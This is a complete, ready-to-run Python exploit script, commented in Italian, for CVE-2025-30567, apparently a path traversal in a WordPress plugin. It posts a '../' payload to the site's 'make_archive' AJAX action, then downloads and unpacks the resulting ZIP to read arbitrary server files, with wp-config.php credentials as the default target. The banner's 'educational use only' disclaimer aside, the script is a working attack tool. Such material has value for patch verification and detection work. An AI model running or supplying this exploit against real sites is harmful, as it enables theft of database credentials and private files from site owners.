#!/usr/bin/env python3

import requests
import argparse
from urllib.parse import urljoin
import sys
import zipfile
import io
import json
import os

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_banner():
    banner = """
    #################################################################
    #                                                               #
    #      Exploit PoC per CVE-2025-30567 - WP01 Path Traversal     #
    #      Autore: Emanuele De Lucia                                #
    #      NB: Exploit a 2 fasi: creazione + download archivio      #
    #      WARNING: For educational use only.                       #
    #      WARNING: Author is NOT responsible for any misuse.       #
    #################################################################
    """
    print(banner)

def exploit(target_url, file_to_read, traversal_depth):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    })

    print("[INFO] FASE 1: Tentativo di creazione dell'archivio su server remoto...")
    ajax_url = urljoin(target_url, '/wp-admin/admin-ajax.php')
    path_traversal_payload = "../" * traversal_depth + file_to_read

    post_data = {
        'action': 'make_archive',
        'path[]': path_traversal_payload
    }

    print(f"[INFO] Target: {ajax_url}")
    print(f"[INFO] Payload inviato: {post_data}")

    try:
        response_fase1 = session.post(ajax_url, data=post_data, verify=False, timeout=20)

        if response_fase1.status_code != 200:
            print(f"\n[FAIL] FASE 1: Il server ha risposto con codice {response_fase1.status_code}. Impossibile procedere.")
            return

        try:
            response_json = response_fase1.json()
            zip_url = response_json.get('file')
            if not zip_url:
                print("\n[FAIL] FASE 1: La risposta del server non contiene l'URL del file ZIP.")
                print(f"[DEBUG] Risposta ricevuta: {response_fase1.text}")
                return
        except json.JSONDecodeError:
            print("\n[FAIL] FASE 1: La risposta del server non è in formato JSON valido.")
            print(f"[DEBUG] Risposta ricevuta: {response_fase1.text}")
            return
        
        print(f"[SUCCESS] FASE 1: Il server ha risposto con l'URL dell'archivio: {zip_url}")

    except requests.exceptions.RequestException as e:
        print(f"\n[ERROR] FASE 1: Errore di connessione: {e}")
        return

    print("\n[INFO] FASE 2: Eseguo il download ed estraggo il file dall'archivio...")
    
    if not zip_url.startswith(('http://', 'https://')):
        zip_url = urljoin(target_url, zip_url)

    try:
        response_fase2 = session.get(zip_url, verify=False, timeout=20, stream=True)

        if response_fase2.status_code == 200:
            print("[SUCCESS] FASE 2: Archivio ZIP scaricato con successo.")
            
            zip_in_memory = io.BytesIO(response_fase2.content)
            
            with zipfile.ZipFile(zip_in_memory, 'r') as zip_ref:
                base_file_name = os.path.basename(file_to_read)
                file_found = False
                for file_in_zip in zip_ref.namelist():
                    if base_file_name in file_in_zip:
                        print(f"\n[!!!] EXPLOIT RIUSCITO! Contenuto di '{file_in_zip}' trovato.")
                        print("-" * 60)
                        file_content = zip_ref.read(file_in_zip).decode('utf-8', errors='ignore')
                        print(file_content)
                        print("-" * 60)
                        file_found = True
                        break 
                if not file_found:
                    print(f"[FAIL] FASE 2: Il file '{base_file_name}' non è stato trovato.")
                    print(f"[DEBUG] Contenuto dell'archivio: {zip_ref.namelist()}")

        else:
            print(f"[FAIL] FASE 2: Impossibile scaricare l'archivio. Codice di stato: {response_fase2.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"\n[ERROR] FASE 2: Errore durante il download dell'archivio: {e}")
    except zipfile.BadZipFile:
        print("\n[ERROR] FASE 2: Il file scaricato non è un archivio valido.")
    except Exception as e:
        print(f"\n[ERROR] FASE 2: Si è verificato un errore imprevisto: {e}")


if __name__ == '__main__':
    print_banner()
    parser = argparse.ArgumentParser(description="Exploit PoC per CVE-2025-30567 con logica a 2 fasi (Crea e Scarica).")

    parser.add_argument('-u', '--url', required=True, help="L'URL completo del sito WordPress target (es. https://example.com)")
    parser.add_argument('-f', '--file', default='wp-config.php', help="Il file che si desidera leggere (default: wp-config.php)")
    parser.add_argument('-d', '--depth', type=int, default=3, help="Profondità del traversal (numero di '../') (default: 3)")

    args = parser.parse_args()
    exploit(args.url, args.file, args.depth)
